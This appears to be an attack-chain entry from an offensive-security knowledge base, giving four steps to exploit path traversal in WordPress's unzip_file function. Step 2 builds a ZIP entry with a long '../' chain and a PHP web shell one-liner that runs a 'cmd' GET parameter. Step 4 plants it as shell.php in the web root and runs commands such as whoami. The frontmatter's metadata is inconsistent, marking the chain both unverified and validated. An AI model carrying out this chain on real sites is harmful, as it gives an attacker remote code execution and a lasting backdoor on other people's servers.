---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - path-traversal
  - wordpress
  - file-write
  - rce
  - zip-exploitation
type: attack_chain
tools:
  - '[[tools/zip]]'
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Analyze-WordPress-unzip_file-Vulnerability]]'
  - '[[procedures/Craft-Malicious-Zip-with-Path-Traversal]]'
  - '[[procedures/Upload-and-Extract-Malicious-Zip-via-WordPress]]'
  - '[[procedures/Verify-Arbitrary-File-Placement]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.917Z'
description: >-
  Multi-stage attack exploiting path traversal in WordPress unzip_file function
  to write arbitrary files outside the target directory, enabling remote code
  execution via malicious PHP uploads.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# WordPress unzip_file Path Traversal for Arbitrary File Write and RCE

Multi-stage attack chain demonstrating exploitation of the WordPress unzip_file function's path traversal vulnerability, allowing attackers to extract files from malicious ZIP archives to arbitrary server directories. This can lead to remote code execution by placing PHP shells in web-accessible paths. The vulnerability stems from insufficient path normalization in PHP's ZipArchive and PclZip libraries used in /wp-admin/includes/file.php. Applicable to WordPress versions like 4.7.2, exploitation requires authenticated access to upload features such as plugin uploads.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Analyze Vulnerability] --> B[Craft Malicious ZIP]
    B --> C[Upload and Extract]
    C --> D[Verify and Execute]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/zip]]
- Web browser or curl for upload

### Target Environment

- WordPress 4.7.2 or vulnerable versions on Linux with PHP
- Writable directories like /tmp
- Services: Web server (Apache/Nginx) with PHP ZipArchive or PclZip

### Initial Access Requirements

- Authenticated admin access to WordPress dashboard
- Ability to upload ZIP files via plugin/theme upload or custom endpoints
- Network access to the WordPress admin interface

## Detailed Attack Procedures

### Step 1: Analyze WordPress unzip_file Vulnerability
procedure: [[procedures/Analyze-WordPress-unzip_file-Vulnerability]]

**Objective**: Review source code to confirm path traversal weakness in extraction methods.

**Instructions**: Access the WordPress source code, specifically /wp-admin/includes/file.php, and examine the _unzip_file_ziparchive and _unzip_file_pclzip functions. Note the lack of path normalization for ZIP entry filenames relative to the target $to directory.

**Expected Output**: Identification of vulnerable code paths without '../' sequence sanitization.

**Success Indicators**:
- Confirmed absence of path checks in extraction logic
- Understanding of how '../' can escape the target directory

### Step 2: Craft Malicious Zip with Path Traversal
procedure: [[procedures/Craft-Malicious-Zip-with-Path-Traversal]]

**Objective**: Create a ZIP file containing entries with path traversal sequences to write files outside the intended directory.

**Instructions**: Use the [[commands/zip-create-traversal]] command to build a ZIP with a payload file using multiple '../' to reach /tmp:

```bash
zip zip_poc.zip ../../../../../../../../../../tmp/poc_file
```
First, create the poc_file content, e.g., echo '<?php system($_GET["cmd"]); ?>' > poc_file, then adjust the path depth based on the target directory structure.

**Expected Output**: A ZIP file 'zip_poc.zip' with an entry named '../../../../../../../../../../tmp/poc_file' containing the payload.

**Success Indicators**:
- ZIP entry filename verified with 'unzip -l zip_poc.zip'
- Payload file ready for extraction to arbitrary location

### Step 3: Upload and Extract Malicious Zip via WordPress
procedure: [[procedures/Upload-and-Extract-Malicious-Zip-via-WordPress]]

**Objective**: Leverage WordPress upload features to process the malicious ZIP and trigger extraction to unintended paths.

**Instructions**: Log in to the WordPress admin dashboard and use the 'Upload Plugin' feature to upload 'zip_poc.zip'. Alternatively, create a custom PHP script (poc.php) that calls unzip_file('zip_poc.zip', '/wp-content/uploads/') and execute it. The function will extract the payload to /tmp due to traversal.

**Expected Output**: ZIP uploaded and extracted, with poc_file placed in /tmp.

**Success Indicators**:
- No extraction errors in WordPress logs
- File appears in target traversal directory like /tmp

### Step 4: Verify Arbitrary File Placement
procedure: [[procedures/Verify-Arbitrary-File-Placement]]

**Objective**: Confirm the exploitation success and assess potential for RCE by accessing the written file.

**Instructions**: Check the server filesystem for the extracted file in /tmp/poc_file. If a PHP shell was written to a web root path (e.g., adjust traversal to /var/www/html/shell.php), access it via browser with ?cmd=whoami to execute commands.

**Expected Output**: File presence confirmed, and if RCE payload, command output displayed.

**Success Indicators**:
- Arbitrary file written outside upload directory
- Successful command execution if PHP payload in web root

## Attack Chain Summary

### Key Achievements

1. Confirmed path traversal in WordPress unzip_file via code analysis
2. Crafted and uploaded malicious ZIP to write files to /tmp
3. Demonstrated arbitrary file placement, paving way for RCE
4. Highlighted risks in plugins allowing non-admin uploads like NextGen Gallery

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Initial Access]]

---
*Last updated: 2023-10-01T12:00:00Z*
